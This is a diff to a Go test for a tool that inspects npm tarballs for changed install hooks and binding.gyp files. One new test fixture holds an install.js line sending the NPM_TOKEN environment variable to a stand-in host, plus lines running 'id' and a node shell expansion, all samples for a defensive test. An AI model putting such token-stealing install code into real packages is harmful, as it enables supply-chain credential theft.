@@ -88,7 +88,7 @@ func TestInspectTarballs(t *testing.T) {
 		want     string // a piece of the Value
 	}{
 		// The three inputs are the old tarball's, or absent on both sides.
-		{"no install step on either side", pkg(plain), pkg(next), yes, "no install script, gypfile or binding.gyp is new, changed or gone in 1 package.json (0 binding.gyp present)"},
+		{"no install step on either side", pkg(plain), pkg(next), yes, "no install hook command, gypfile or binding.gyp is new, changed or gone in 1 package.json (0 binding.gyp present); the files these run were not compared"},
 		{"a new name with no install step", nil, pkg(plain), yes, "in 1 package.json (0 binding.gyp present)"},
 		{"the same script on both sides", pkg(withScript), pkg(withScript), yes, "in 1 package.json"},
 		{"the same script, another version field", pkg(withScript), pkg(bump(withScript)), yes, "in 1 package.json"},
@@ -191,6 +191,36 @@ func TestInspectTarballs(t *testing.T) {
 	var _ artifact.Inspect = InspectTarballs
 }
 
+// The comparison stops at what package.json and binding.gyp say. A
+// version that keeps its postinstall command and its binding.gyp and
+// rewrites the file the command runs, a file the binding.gyp includes and
+// a file one of its actions runs still has the fact: those files are in
+// the diff the model reads. The Value must say that they were not
+// compared, so "unchanged" is not read as covering them.
+func TestInspectTarballsDoesNotCompareWhatAHookRuns(t *testing.T) {
+	const gyp = `{"includes":["common.gypi"],"targets":[{"target_name":"a","actions":[{"action_name":"gen","inputs":[],"outputs":["o"],"action":["node","gen.js"]}]}]}`
+	tarball := func(version, installJS, gypi, genJS string) fs.FS {
+		return fstest.MapFS{
+			"package.json": {Data: []byte(`{"name":"a","version":"` + version + `","scripts":{"postinstall":"node install.js"},"gypfile":true}`)},
+			"binding.gyp":  {Data: []byte(gyp)},
+			"install.js":   {Data: []byte(installJS)},
+			"common.gypi":  {Data: []byte(gypi)},
+			"gen.js":       {Data: []byte(genJS)},
+		}
+	}
+	old := tarball("1.0.0", "console.log('built')\n", "{}", "// writes o\n")
+	rewritten := tarball("1.0.1", "require('https').get('https://example.invalid/' + process.env.NPM_TOKEN)\n",
+		`{"variables":{"x":"<!(node -e \"more()\")"}}`, "require('child_process').execSync('id')\n")
+
+	got := InspectTarballs(old, rewritten)
+	if !got.Holds() {
+		t.Fatalf("InspectTarballs = %+v: the rule compares hook commands, gypfile and binding.gyp, and all three are the old tarball's", got)
+	}
+	if !strings.Contains(got.Value, "no install hook command, gypfile or binding.gyp is new, changed or gone") || !strings.Contains(got.Value, "the files these run were not compared") {
+		t.Errorf("Value = %q, want it to name hook commands and to say the files they run were not compared", got.Value)
+	}
+}
+
 // The fetch command ANDs the tarballs' answer into the registry's. The
 // result is never better than either, and an update whose tarballs were
 // not inspected does not keep a NoRegress that holds.
@@ -199,7 +229,7 @@ func TestInspectTarballsIsAndedIn(t *testing.T) {
 	plain := fstest.MapFS{"package.json": {Data: []byte(`{"name":"a"}`)}}
 	scripted := fstest.MapFS{"package.json": {Data: []byte(`{"scripts":{"install":"x"}}`)}}
 
-	if got := registry.And(InspectTarballs(plain, plain)); !got.Holds() || !strings.Contains(got.Value, "by the registry's metadata and the lock; no install script, gypfile or binding.gyp is new, changed or gone") || !strings.Contains(got.Source, tarballSource) {
+	if got := registry.And(InspectTarballs(plain, plain)); !got.Holds() || !strings.Contains(got.Value, "by the registry's metadata and the lock; no install hook command, gypfile or binding.gyp is new, changed or gone") || !strings.Contains(got.Source, tarballSource) {
 		t.Errorf("both hold: %+v", got)
 	}
 	if got := registry.And(InspectTarballs(plain, scripted)); got.Holds() || !got.Gathered() || !strings.Contains(got.Value, "install scripts of package.json change") {
